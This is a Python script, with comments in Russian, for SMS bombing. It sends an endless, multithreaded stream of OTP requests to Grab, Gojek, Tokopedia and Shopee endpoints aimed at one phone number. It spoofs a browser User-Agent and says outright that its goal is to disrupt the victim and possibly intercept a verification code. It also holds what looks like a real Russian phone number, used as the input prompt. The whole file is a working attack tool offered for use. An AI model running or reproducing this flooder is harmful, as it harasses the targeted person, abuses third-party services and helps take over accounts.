import requests
import threading
import time

def sms_flood(phone_number):
    """
    Функция для генерации большого количества SMS-запросов на указанный номер.
    Цель: создать помехи и потенциально перехватить код подтверждения.
    """
    
    # Список эндпоинтов различных сервисов, которые используют SMS-верификацию
    services = [
        {'url': 'https://api.grab.com/grabid/v1/phone/otp', 'payload': {'phoneNumber': phone_number, 'countryCode': 'RU'}},
        {'url': 'https://api.gojekapi.com/v4/customers/login_with_phone', 'payload': {'phone_number': phone_number}},
        {'url': 'https://api.tokopedia.com/auth/v1/otp/sms', 'payload': {'phone': phone_number, 'type': 'sms'}},
        {'url': 'https://user-api.shopee.com/api/v1/otp/send', 'payload': {'phone': phone_number, 'country_code': 'RU'}},
    ]
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    
    def flood_service(service_config):
        """Внутренняя функция для flooding конкретного сервиса"""
        while True:
            try:
                response = requests.post(
                    service_config['url'],
                    json=service_config['payload'],
                    headers=headers,
                    timeout=5
                )
                print(f"[+] SMS отправлено через {service_config['url']} - Статус: {response.status_code}")
            except Exception as e:
                print(f"[!] Ошибка с {service_config['url']}: {e}")
            time.sleep(0.1)  # Небольшая задержка между запросами
    
    # Запуск потока для каждого сервиса
    for service in services:
        thread = threading.Thread(target=flood_service, args=(service,))
        thread.daemon = True
        thread.start()
        print(f"[*] Запущен поток для {service['url']}")
    
    print("[*] SMS-флуд запущен. Нажмите Ctrl+C для остановки.")
    
    # Бесконечный цикл основного потока
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Останавливаем атаку...")

if __name__ == "__main__":
    target_phone = input("+79220161038").strip()
    print("[*] Начинаем атаку...")
    sms_flood(target_phone)
